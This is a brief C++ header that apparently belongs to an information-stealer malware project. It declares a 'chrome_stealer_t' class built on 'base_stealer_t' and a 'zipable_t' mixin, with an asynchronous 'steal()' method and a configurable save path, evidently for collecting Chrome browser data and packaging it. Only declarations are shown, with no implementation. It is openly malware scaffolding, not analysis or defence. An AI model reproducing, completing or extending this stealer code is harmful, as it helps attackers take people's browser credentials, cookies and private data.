#ifndef CHROME_STEALER_H
#define CHROME_STEALER_H
#include "base_stealer.h"
#include "zipable.h"

class chrome_stealer_t : public base_stealer_t, public zipable_t
{
public:
    asio::awaitable<std::unique_ptr<message_t>> steal() override;

    void set_save_folder(const fs::path& in_save_path, bool is_global = true) override;

protected:
    fs::path save_path;
};

#endif //CHROME_STEALER_H
